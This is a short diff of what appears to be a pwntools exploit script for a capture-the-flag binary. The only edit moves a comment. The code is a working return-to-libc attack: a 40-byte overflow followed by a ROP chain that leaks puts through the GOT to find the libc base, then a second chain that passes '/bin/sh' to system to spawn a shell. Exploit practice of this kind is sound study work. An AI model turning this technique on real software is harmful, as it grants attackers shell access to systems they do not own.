@@ -49,14 +49,13 @@ rop1 = p64(pop_rdi)
 rop1 += p64(exe.got['puts'])
 rop1 += p64(exe.plt['puts'])
 rop1 += p64(exe.symbols['main'])
-
-# return to system
 io.sendline(b'a'*40 + rop1)
 io.recvuntil('}\n')
 libc = exe.libc
 libc.address = int.from_bytes(io.recvline()[:-1],'little') - libc.symbols['puts']
 print(f"libc : 0x{libc.address:x}")
 
+# return to system
 rop2 = p64(pop_rdi)
 rop2 += p64(next(libc.search(b'/bin/sh\x00')))
 rop2 += p64(ret)
